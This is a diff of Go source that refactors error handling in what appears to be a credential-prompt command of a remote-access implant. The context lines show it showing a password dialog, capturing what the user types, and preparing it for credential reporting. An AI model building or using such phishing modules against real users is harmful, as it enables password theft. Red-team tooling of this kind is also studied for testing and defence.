@@ -42,11 +42,7 @@ func (c *CredentialPromptCommand) Execute(task structs.Task) structs.CommandResu
 
 	if task.Params != "" {
 		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("Error parsing parameters: %v", err),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("Error parsing parameters: %v", err)
 		}
 	}
 
@@ -76,27 +72,15 @@ func (c *CredentialPromptCommand) Execute(task structs.Task) structs.CommandResu
 		output := strings.TrimSpace(string(out))
 		if strings.Contains(output, "User canceled") ||
 			strings.Contains(output, "(-128)") {
-			return structs.CommandResult{
-				Output:    "User cancelled the dialog",
-				Status:    "success",
-				Completed: true,
-			}
+			return successResult("User cancelled the dialog")
 		}
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Dialog failed: %v\n%s", err, output),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Dialog failed: %v\n%s", err, output)
 	}
 
 	password := strings.TrimSpace(string(out))
 	defer structs.ZeroString(&password)
 	if password == "" {
-		return structs.CommandResult{
-			Output:    "User submitted empty password",
-			Status:    "success",
-			Completed: true,
-		}
+		return successResult("User submitted empty password")
 	}
 
 	// Get current username for credential reporting
